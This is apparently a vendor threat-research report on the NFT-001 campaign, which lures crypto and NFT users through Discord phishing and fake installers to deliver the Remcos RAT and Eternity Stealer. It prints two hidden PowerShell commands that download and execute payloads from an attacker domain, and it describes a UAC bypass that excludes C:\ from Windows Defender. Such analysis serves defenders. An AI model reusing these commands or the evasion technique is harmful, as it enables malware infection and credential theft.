A non-fungible token (NFT) is a record on a blockchain associated with a digital or physical
asset—usually a digital file such as a photo, video, or audio. An NFT’s ownership is recorded
in the blockchain, and it can be sold and traded. NFTs differ from cryptocurrencies, which are
mostly fungible, in that NFTs are unique and non-substitutable. The NFT market is booming,
with trading volume exploding by over 20,000 percent from 2020 to 2021. Cybercriminals
have rushed to exploit this trend, which the Morphisec Threat Labs team has previously
examined in a white paper. The Threat Labs team now has fresh research on the crypto and
NFT malware NFT-001, which first surfaced in November 2020.
The NFT-001 attack sequence typically includes the following steps:
Attackers target users in crypto and NFT communities on Discord and other forums
The victim receives a private phishing message related to an NFT or financial
opportunity. The message includes a link to a fake website and malicious app that
promises an improved user experience
The downloaded malware unpacks a remote access trojan (RAT) that is used to steal
browsing data, install a keylogger, and other surveillance functionalities
1/7

The attacker then uses the data for identity theft and to steal the victim’s wallet and
other possessions
The threat actor has now switched from the Babadeda crypter to a new staged downloader
while using the same delivery infrastructure as before. The new downloader adds increased
defense evasion abilities to this malware.

New NFT-001 Technical Details
Morphisec Labs has tracked several waves of the NFT malware delivering the Remcos RAT
since it first surfaced. In June 2022 we found a shift in the crypter used to deliver the
Remcos RAT. The Babadeda crypter has now been discarded for a new staged downloader.

The malware delivery hasn’t changed much. It sends a user a private message enticing
them to download a related application supposedly granting the user access to the newest
features. Below is an example of the phishing message targeting users of “Dune”—an
Ethereum-based crypto data analytics platform.

If a user clicks the hyperlink in the message, it directs him to a decoy website that mimics the
original. There, the user is prompted to download the malicious “installer” which infects the
victim’s machine with the Remcos RAT.

3/7

For more information on the infrastructure, read Morphisec’s previously mentioned white
paper, “Journey of a Crypto Scammer.”

The New Staged Downloader
The threat actor keeps the first stage “installers” with a low detection rate.

The execution starts by performing a User Account Control (UAC) bypass. It hijacks the
default handler for the ms-settings protocol and sets it to execute a Powershell command
that adds the C:\ folder to the Windows Defender exclusion list. The code that performs this
UAC bypass technique is well documented in the open-source repository. But the attacker
employed it extremely poorly—he didn't even bother to remove unnecessary WinAPI calls,
such as printing to the console.
4/7

After excluding the C:\ folder from Windows Defender, the following Powershell commands
are de-obfuscated and executed:
1) The first Powershell command downloads and executes a plain Remcos RAT (C2 144.91.79[.]86).
powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle
Hidden $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest
http://rwwmefkauiaa[.]ru/bs8bo90akv.exe -OutFile
\"$env:appdata/Microsoft/dllservice.exe\"; Start-Process -Filepath
\"$env:appdata/Microsoft/dllservice.exe\"
The C2 used in that Remcos RAT was also seen in the wild in samples using the Babadeda
crypter. This bolsters our suspicion it's the same threat actor.
2) The second Powershell command downloads and executes Eternity Stealer which steals
sensitive information from a victim’s machine such as:
Browser information like login credentials, history, cookies
VPN and FTP client data
Messaging software data
Password management software data
powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle
Hidden $ProgressPreference = 'SilentlyContinue'; mkdir
\"$env:appdata/Microsoft/AddIns\"; Invoke-WebRequest http://rwwmefkauiaa[.]ru/u84ls.exe
-OutFile \"$env:appdata/Microsoft/AddIns/exclusions.exe\"; Start-Process -Filepath
\"$env:appdata/Microsoft/AddIns/exclusions.exe\"
We also noticed a variant of this downloader in the Tandem Espionage campaign shares
commonalities with this campaign:
There is a similar UAC bypass technique using fodhelper.exe (less evasive
implementation)
Downloading and executing two malicious executables (Arkei stealer and Eternity
stealer)
The Eternity stealer is downloaded by the exact same Powershell command as the
second Powershell command from the same URL

5/7

Though the URL downloading the Eternity stealer is the same, we think these may be two
different threat actors that used the same downloader as a service.

Defending Against NFT Malware Like NFT-001
The crypto and NFT communities are on the cutting edge of financial innovation, and they
are a lucrative target for attackers. This naturally means there’s more scope for threat actors
to exploit gaps in such rapidly evolving technology. This new staged downloader for NFT-001
is more evasive than the earlier version, increasing its ability to sneak past traditional
cybersecurity solutions. According to the latest Picus report, defense evasion is now the
most popular tactic among malware operators.
This tactic is popular because there aren’t many effective tools against defense evasion. One
such tool is Morphisec’s revolutionary Moving Target Defense (MTD) technology, which
comprehensively prevents defense evasion techniques. Unlike other cybersecurity solutions
which focus on detecting known patterns with response playbooks, MTD preemptively blocks
attacks on memory and applications and remediates the need for a response. To learn more
